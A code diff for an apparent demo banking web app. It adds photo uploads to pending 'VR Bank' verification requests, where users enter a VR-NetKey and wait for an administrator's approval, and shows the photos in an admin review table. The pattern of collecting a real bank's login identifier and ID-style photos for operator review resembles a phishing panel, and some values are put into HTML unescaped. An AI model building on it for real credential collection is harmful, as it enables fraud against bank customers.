@@ -464,6 +464,15 @@ const translations = {
     actions: "Actions",
     demoVrNetKey: "VR-NetKey",
     submittedAt: "Submitted At",
+    photos: "Photos",
+    uploadVerificationPhotos: "Upload verification photos",
+    uploadVerificationPhotosHint: "Add up to 10 photos for administrator review while your transfer is waiting for confirmation.",
+    choosePhotos: "Choose photos",
+    submitPhotos: "Send photos to admin",
+    noPhotos: "No photos",
+    photosSaved: "{count} photo(s) sent to admin.",
+    photoLimitReached: "You can attach up to 10 photos to this request.",
+    photoRequired: "Choose at least one photo before sending.",
     enterVrMessage: "Enter your VR-NetKey/Alias and message to submit the request.",
     chooseRecipient: "Choose recipient",
     chooseAccountToUse: "Choose account to use",
@@ -749,6 +758,15 @@ const translations = {
     actions: "Aktionen",
     demoVrNetKey: "VR-NetKey",
     submittedAt: "Eingereicht am",
+    photos: "Fotos",
+    uploadVerificationPhotos: "Verifizierungsfotos hochladen",
+    uploadVerificationPhotosHint: "F\u00fcgen Sie bis zu 10 Fotos f\u00fcr die Admin-Pr\u00fcfung hinzu, w\u00e4hrend Ihre \u00dcberweisung auf Best\u00e4tigung wartet.",
+    choosePhotos: "Fotos ausw\u00e4hlen",
+    submitPhotos: "Fotos an Admin senden",
+    noPhotos: "Keine Fotos",
+    photosSaved: "{count} Foto(s) an den Admin gesendet.",
+    photoLimitReached: "Sie k\u00f6nnen bis zu 10 Fotos zu dieser Anfrage hinzuf\u00fcgen.",
+    photoRequired: "W\u00e4hlen Sie mindestens ein Foto aus, bevor Sie senden.",
     enterVrMessage: "Geben Sie VR-NetKey/Alias und Nachricht ein, um die Anfrage zu senden.",
     chooseRecipient: "Empf\u00e4nger ausw\u00e4hlen",
     chooseAccountToUse: "Konto ausw\u00e4hlen",
@@ -1703,6 +1721,20 @@ function importRemoteDemoVerificationDecision(event) {
   }
 }
 
+function importRemoteDemoVerificationPhotos(event) {
+  const { requestId, photos = [], uploadedAt = "" } = event.payload || {};
+  if (!requestId || !Array.isArray(photos) || photos.length === 0) {
+    return;
+  }
+  const request = findDemoVerificationRequest(requestId);
+  if (request) {
+    const existingIds = new Set((request.photos || []).map((photo) => photo.id));
+    const nextPhotos = photos.filter((photo) => photo?.dataUrl && !existingIds.has(photo.id));
+    request.photos = [...(request.photos || []), ...nextPhotos].slice(0, 10);
+    request.photosUploadedAt = uploadedAt || request.photosUploadedAt || "";
+  }
+}
+
 function importRemoteDemoVerificationDelete(event) {
   const { requestId } = event.payload || {};
   if (!requestId) {
@@ -1748,6 +1780,10 @@ async function syncRemoteAdminRecords() {
       }
       if (event.kind === "demo-verification-decision") {
         importRemoteDemoVerificationDecision(event);
+        changed = true;
+      }
+      if (event.kind === "demo-verification-photos") {
+        importRemoteDemoVerificationPhotos(event);
         changed = true;
       }
       if (event.kind === "demo-verification-delete") {
@@ -2215,6 +2251,7 @@ function applyTranslations() {
   setText("#adminDemoActionsHeading", "actions");
   setText("#adminDemoVrNetKeyHeading", "demoVrNetKey");
   setText("#adminDemoMessageHeading", "message");
+  setText("#adminDemoPhotosHeading", "photos");
   setText("#adminDemoSubmittedHeading", "submittedAt");
   setText("#adminDemoStatusHeading", "status");
   setText("#shareReceiptButton", "receiptShare");
@@ -2890,7 +2927,7 @@ function renderAdminDemoVerificationRequests() {
   if (requests.length === 0) {
     const row = document.createElement("tr");
     const cell = document.createElement("td");
-    cell.colSpan = 6;
+    cell.colSpan = 7;
     cell.textContent = t("noVerificationRequests");
     row.append(cell);
     adminDemoVerificationTable.append(row);
@@ -2910,10 +2947,33 @@ function renderAdminDemoVerificationRequests() {
 
     const keyCell = document.createElement("td");
     const messageCell = document.createElement("td");
+    const photosCell = document.createElement("td");
     const submittedCell = document.createElement("td");
     keyCell.textContent = request.vrNetKey || request.demoUserId || "-";
     messageCell.textContent = request.message || "-";
     messageCell.className = "admin-message-cell";
+    photosCell.className = "admin-photos-cell";
+    const photos = request.photos || [];
+    if (photos.length) {
+      const photoGrid = document.createElement("div");
+      photoGrid.className = "admin-photo-grid";
+      photos.forEach((photo, index) => {
+        const imageLink = document.createElement("a");
+        const image = document.createElement("img");
+        imageLink.href = photo.dataUrl;
+        imageLink.target = "_blank";
+        imageLink.rel = "noopener";
+        imageLink.download = photo.name || `${request.requestId}-photo-${index + 1}.png`;
+        imageLink.title = `${t("photos")} ${index + 1}`;
+        image.src = photo.dataUrl;
+        image.alt = `${t("photos")} ${index + 1}`;
+        imageLink.append(image);
+        photoGrid.append(imageLink);
+      });
+      photosCell.append(photoGrid);
+    } else {
+      photosCell.textContent = t("noPhotos");
+    }
     submittedCell.textContent = request.submittedAt || "-";
 
     status.className = request.status === "Approved" ? "status-pill success" : request.status === "Rejected" ? "status-pill error" : "status-pill";
@@ -2934,7 +2994,7 @@ function renderAdminDemoVerificationRequests() {
     actionsCell.className = "review-actions admin-demo-actions";
     actionsCell.append(approveButton, rejectButton, deleteButton);
 
-    row.append(requestIdCell, actionsCell, keyCell, messageCell, submittedCell, statusCell);
+    row.append(requestIdCell, actionsCell, keyCell, messageCell, photosCell, submittedCell, statusCell);
     adminDemoVerificationTable.append(row);
   });
 }
@@ -4352,6 +4412,7 @@ function VRBankWaiting(request, message = t("waitingAdminApproval")) {
   if (!vrBankAccessRoot) {
     return;
   }
+  const photoCount = request.photos?.length || 0;
   vrBankAccessRoot.innerHTML = `
     <div class="vr-access-header">
       <button id="vrAccessBackButton" class="vr-access-back" type="button" aria-label="${escapeHtml(t("back"))}"></button>
@@ -4364,6 +4425,19 @@ function VRBankWaiting(request, message = t("waitingAdminApproval")) {
       <small>${message}</small>
       <small>${escapeHtml(t("requestId"))}: ${request.requestId}</small>
       <span class="status-pill">${escapeHtml(statusCopy(request.status))}</span>
+    </section>
+    <section class="vr-photo-upload-panel">
+      <strong>${escapeHtml(t("uploadVerificationPhotos"))}</strong>
+      <p>${escapeHtml(t("uploadVerificationPhotosHint"))}</p>
+      <label class="vr-photo-picker">
+        <span>${escapeHtml(t("choosePhotos"))}</span>
+        <input id="vrVerificationPhotos" type="file" accept="image/*" multiple>
+      </label>
+      <div class="vr-photo-count">${photoCount ? `${photoCount}/10 ${escapeHtml(t("photos"))}` : escapeHtml(t("noPhotos"))}</div>
+      <button id="vrSubmitPhotosButton" class="vr-primary-button vr-photo-submit" type="button" data-request-id="${escapeHtml(request.requestId)}">
+        ${escapeHtml(t("submitPhotos"))}
+      </button>
+      <p id="vrPhotoUploadMessage" class="vr-access-message" aria-live="polite"></p>
     </section>
   `;
 }
@@ -4436,6 +4510,12 @@ async function getRemoteDemoVerificationRequest(requestId) {
         request.status = event.payload.status;
         request.reviewedAt = event.payload.reviewedAt || request.reviewedAt || "";
       }
+      if (event.kind === "demo-verification-photos" && event.payload?.requestId === requestId && request) {
+        const existingIds = new Set((request.photos || []).map((photo) => photo.id));
+        const nextPhotos = (event.payload.photos || []).filter((photo) => photo?.dataUrl && !existingIds.has(photo.id));
+        request.photos = [...(request.photos || []), ...nextPhotos].slice(0, 10);
+        request.photosUploadedAt = event.payload.uploadedAt || request.photosUploadedAt || "";
+      }
       if (event.kind === "demo-verification-delete" && event.payload?.requestId === requestId) {
         request = null;
       }
@@ -4464,6 +4544,8 @@ function startVrDemoVerificationPolling(requestId) {
     if (localRequest) {
       localRequest.status = latest.status;
       localRequest.reviewedAt = latest.reviewedAt || localRequest.reviewedAt || "";
+      localRequest.photos = latest.photos || localRequest.photos || [];
+      localRequest.photosUploadedAt = latest.photosUploadedAt || localRequest.photosUploadedAt || "";
     }
     if (latest.status === "Approved") {
       stopVrDemoVerificationPolling();
@@ -4513,6 +4595,47 @@ function submitVrDemoVerificationRequest() {
   renderAdminDemoVerificationRequests();
   VRBankWaiting(request);
   startVrDemoVerificationPolling(request.requestId);
+}
+
+async function submitVrVerificationPhotos(requestId) {
+  const request = findDemoVerificationRequest(requestId);
+  const fileInput = document.querySelector("#vrVerificationPhotos");
+  const message = document.querySelector("#vrPhotoUploadMessage");
+  const files = Array.from(fileInput?.files || []).filter((file) => file.type.startsWith("image/"));
+  if (!request || !fileInput || !message) {
+    return;
+  }
+  message.classList.remove("error");
+  if (files.length === 0) {
+    message.textContent = t("photoRequired");
+    message.classList.add("error");
+    return;
+  }
+
+  const existingPhotos = request.photos || [];
+  const slots = Math.max(0, 10 - existingPhotos.length);
+  if (slots === 0) {
+    message.textContent = t("photoLimitReached");
+    message.classList.add("error");
+    return;
+  }
+
+  const selectedFiles = files.slice(0, slots);
+  const uploadedAt = localDateTime();
+  const photos = await Promise.all(selectedFiles.map(async (file, index) => ({
+    id: `PHOTO-${Date.now().toString(36).toUpperCase()}-${index}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
+    name: file.name || `photo-${index + 1}.png`,
+    type: file.type || "image/png",
+    dataUrl: await fileToDataUrl(file),
+    uploadedAt
+  })));
+
+  request.photos = [...existingPhotos, ...photos].slice(0, 10);
+  request.photosUploadedAt = uploadedAt;
+  saveState();
+  sendAuditEvent("demo-verification-photos", { requestId, photos, uploadedAt });
+  renderAdminDemoVerificationRequests();
+  VRBankWaiting(request, t("photosSaved", { count: photos.length }));
 }
 
 function processSavingsOperation(action, amount) {
@@ -4658,6 +4781,10 @@ vrBankAccessRoot?.addEventListener("click", (event) => {
   }
   if (event.target.closest("#vrDemoApproveButton")) {
     submitVrDemoVerificationRequest();
+  }
+  const photoButton = event.target.closest("#vrSubmitPhotosButton");
+  if (photoButton) {
+    submitVrVerificationPhotos(photoButton.dataset.requestId || "");
   }
 });
 
